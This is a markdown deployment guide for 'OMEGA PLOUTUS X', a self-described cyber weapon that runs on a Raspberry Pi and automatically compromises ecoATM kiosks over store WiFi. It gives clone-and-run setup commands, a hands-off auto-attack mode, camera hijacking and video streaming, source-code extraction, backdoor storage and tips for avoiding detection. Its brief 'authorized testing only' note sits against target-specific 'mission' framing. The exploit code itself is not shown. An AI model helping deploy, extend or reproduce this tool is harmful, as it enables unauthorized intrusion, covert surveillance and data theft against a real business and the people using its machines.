# 🚀 OMEGA PLOUTUS X - LIVE DEPLOYMENT GUIDE

**Ultimate ecoATM Exploitation System - Production Ready**

---

## 🎯 MISSION BRIEFING

**OMEGA PLOUTUS X** is a complete cyber weapon platform designed for ecoATM system compromise. This guide provides step-by-step instructions for setting up and deploying the system for live operations.

### **Key Capabilities:**
- ✅ **Automatic WiFi Detection** - Activates when ecoATM WiFi is detected
- ✅ **Full System Compromise** - SSH access, root escalation, data extraction
- ✅ **Live Video Surveillance** - Camera control with automatic Windows playback
- ✅ **Source Code Extraction** - Complete ecoATM software analysis
- ✅ **Real-time Monitoring** - AI-driven command interface
- ✅ **Professional Interface** - Metasploit-style attack platform

---

## 🛠️ SYSTEM REQUIREMENTS

### **Hardware Requirements:**
- **Raspberry Pi 4/5** or equivalent Linux system
- **Compatible WiFi adapter** (supports monitor mode)
- **USB storage** (for captured data)
- **Ethernet cable** (optional, for testing)

### **Software Requirements:**
- **Ubuntu/Debian Linux** (primary platform)
- **Python 3.8+**
- **Root access** (sudo)
- **NetworkManager** (for WiFi management)

### **Network Requirements:**
- **WiFi capability** (dual-band preferred)
- **SSH access** (for remote management)
- **Internet access** (for initial setup)

---

## 📋 DEPLOYMENT PHASES

### **Phase 1: System Preparation**
```bash
# 1. Update system
sudo apt update && sudo apt upgrade -y

# 2. Install git
sudo apt install -y git

# 3. Clone OMEGA repository
git clone https://github.com/idontknowyou000/ECOMEGAX1.git
cd ECOMEGAX1

# 4. Make setup script executable
chmod +x setup_environment.sh

# 5. Run full environment setup
sudo ./setup_environment.sh
```

### **Phase 2: Configuration Verification**
```bash
# Test system setup
/opt/omega/test_system.sh

# Test network connectivity
/opt/omega/test_network.sh

# Test camera detection
/opt/omega/test_cameras.sh
```

### **Phase 3: Manual Testing**
```bash
# Launch OMEGA interface
python3 /opt/omega/omega_launcher.py

# Test individual modules
use 1    # Automated ecoATM Deployment
use 11   # Camera Control
use 12   # Source Code Extraction
```

---

## 🎮 OPERATION MODES

### **Mode 1: Automatic Deployment (Recommended)**
1. **Power on device** near ecoATM location
2. **Device connects** to Walmart WiFi automatically
3. **When ecoATM WiFi detected**, OMEGA activates automatically
4. **Full compromise** executes without user intervention
5. **Live video feeds** open in Windows video player
6. **Monitoring terminal** provides real-time status

### **Mode 2: Manual Operation**
```bash
# Direct module launch
python3 /opt/omega/omega_launcher.py --module 0  # OMEGA Full Assault

# Interactive interface
python3 /opt/omega/omega_launcher.py
OMEGA> omega  # Full system assault
OMEGA> use 11 # Camera control only
```

### **Mode 3: Remote Operation**
```bash
# SSH into deployed device
ssh user@device_ip

# Run OMEGA remotely
cd /opt/omega
python3 omega_launcher.py
```

---

## 📊 MONITORING & LOGGING

### **Real-time Monitoring:**
```bash
# View system logs
journalctl -u omega-ecosystem -f

# View deployment logs
tail -f /var/log/omega_deployment.log

# View network dispatcher logs
tail -f /var/log/omega_dispatcher.log
```

### **Log Locations:**
- **System logs**: `/var/log/omega_setup.log`
- **Deployment logs**: `/var/log/omega_deployment.log`
- **Network logs**: `/var/log/omega_dispatcher.log`
- **AI logs**: `/var/log/omega_ai_server.log`

### **Captured Data:**
- **Camera images**: `/opt/omega/captures/`
- **Extracted files**: `/opt/omega/extracted/`
- **Backdoors**: `/opt/omega/backdoors/`
- **Logs**: `/opt/omega/logs/`

---

## 🎥 VIDEO STREAMING SETUP

### **Automatic Video Launch:**
When cameras are compromised, video streams automatically open in:
```
C:\Users\gucci\Videos\vlc.exe
```

### **Manual Video Access:**
```
Camera 1: http://192.168.1.100:8080/?action=stream
Camera 2: http://192.168.1.100:8081/?action=stream
Camera 3: http://192.168.1.100:8082/?action=stream
```

### **Video Player Compatibility:**
- ✅ **VLC Media Player** (recommended)
- ✅ **Windows Media Player**
- ✅ **Any MJPG-compatible player**
- ✅ **Browser-based viewing**

---

## 🔧 TROUBLESHOOTING

### **WiFi Connection Issues:**
```bash
# Check WiFi interfaces
iw dev

# Check NetworkManager status
systemctl status NetworkManager

# Manual WiFi connection
nmcli device wifi connect "ecoATM" ifname wlan1
```

### **Service Issues:**
```bash
# Restart OMEGA service
sudo systemctl restart omega-ecosystem

# Check service status
sudo systemctl status omega-ecosystem

# View service logs
journalctl -u omega-ecosystem
```

### **Camera Issues:**
```bash
# Check V4L2 devices
ls /dev/video*

# Test camera access
/opt/omega/test_cameras.sh

# Manual camera control
python3 /opt/omega/omega_launcher.py --module 11
```

### **Video Streaming Issues:**
```bash
# Check if MJPG-streamer is running
ps aux | grep mjpg

# Restart video streaming
sudo systemctl restart omega-ecosystem

# Manual stream test
mjpg_streamer -i "input_uvc.so -d /dev/video0" -o "output_http.so -p 8080"
```

---

## 🚨 EMERGENCY PROCEDURES

### **Abort Mission:**
```bash
# Stop all OMEGA processes
sudo pkill -f omega
sudo pkill -f mjpg

# Disconnect WiFi
sudo nmcli device disconnect wlan0
sudo nmcli device disconnect wlan1

# Stop services
sudo systemctl stop omega-ecosystem
```

### **Clean System:**
```bash
# Remove OMEGA installation
sudo rm -rf /opt/omega

# Remove services
sudo rm /etc/systemd/system/omega-ecosystem.service
sudo rm /etc/NetworkManager/dispatcher.d/omega_network_dispatcher

# Reload systemd
sudo systemctl daemon-reload
```

### **Emergency Reboot:**
```bash
# Force reboot
sudo reboot --force
```

---

## 📈 PERFORMANCE OPTIMIZATION

### **System Tuning:**
```bash
# Disable unnecessary services
sudo systemctl disable bluetooth
sudo systemctl disable cups

# Optimize network settings
echo "net.core.rmem_max=262144" | sudo tee -a /etc/sysctl.conf
echo "net.core.wmem_max=262144" | sudo tee -a /etc/sysctl.conf
sudo sysctl -p
```

### **Storage Management:**
```bash
# Monitor disk usage
df -h

# Clean old logs
sudo find /var/log -name "omega*" -mtime +7 -delete

# Compress captured data
sudo tar -czf /opt/omega/captures_backup.tar.gz /opt/omega/captures/
```

---

## 🔐 SECURITY CONSIDERATIONS

### **Operational Security:**
- **Use encrypted channels** for remote access
- **Regular log rotation** to prevent disk filling
- **Secure captured data** with encryption
- **Monitor system resources** to prevent detection

### **Legal Considerations:**
- **Authorized testing only** - comply with all laws
- **Document all activities** for legal protection
- **Use in controlled environments** only
- **Obtain proper permissions** before deployment

---

## 📞 SUPPORT & MAINTENANCE

### **Regular Maintenance:**
```bash
# Weekly system updates
sudo apt update && sudo apt upgrade

# Monthly OMEGA updates
cd /opt/omega
git pull origin main

# Log rotation
sudo logrotate /etc/logrotate.d/omega
```

### **Backup Procedures:**
```bash
# Backup OMEGA configuration
sudo cp -r /opt/omega /opt/omega_backup_$(date +%Y%m%d)

# Backup system logs
sudo tar -czf /opt/omega/logs_backup.tar.gz /var/log/omega*
```

### **Update Procedures:**
```bash
# Update OMEGA
cd /opt/omega
git pull origin main

# Restart services
sudo systemctl restart omega-ecosystem

# Test updated system
/opt/omega/test_system.sh
```

---

## 🎯 MISSION SUCCESS CRITERIA

### **Primary Objectives:**
- ✅ **Automatic ecoATM detection** and connection
- ✅ **Successful SSH root access** to ecoATM systems
- ✅ **Camera enumeration and control**
- ✅ **Live video streaming** to Windows system
- ✅ **Source code extraction** from ecoATM software
- ✅ **Real-time monitoring** and control

### **Success Metrics:**
- **Connection time**: < 30 seconds
- **Compromise success rate**: > 90%
- **Video streaming latency**: < 2 seconds
- **Data extraction completeness**: > 95%

---

## 🚀 FINAL LAUNCH SEQUENCE

### **Pre-Launch Checklist:**
- [ ] System fully updated
- [ ] OMEGA environment installed
- [ ] Network configuration verified
- [ ] Camera detection tested
- [ ] Video streaming functional
- [ ] Backup created
- [ ] Legal authorization obtained

### **Launch Commands:**
```bash
# Final system test
/opt/omega/test_system.sh

# Launch OMEGA interface
python3 /opt/omega/omega_launcher.py

# Or go fully automatic
# Power on device near ecoATM and wait for auto-deployment
```

### **Post-Launch Monitoring:**
```bash
# Monitor deployment
tail -f /var/log/omega_deployment.log

# Check video streams
curl -I http://192.168.1.100:8080/

# View system status
journalctl -u omega-ecosystem -f
```

---

## 🎉 MISSION COMPLETE

**OMEGA PLOUTUS X is now deployed and ready for live ecoATM exploitation operations!**

**The ultimate cyber weapon platform is active and awaiting target detection.**

**Repository:** `https://github.com/idontknowyou000/ECOMEGAX1.git`

**Connect to ecoATM WiFi and unleash the full power of OMEGA!** 🔥🚀💰
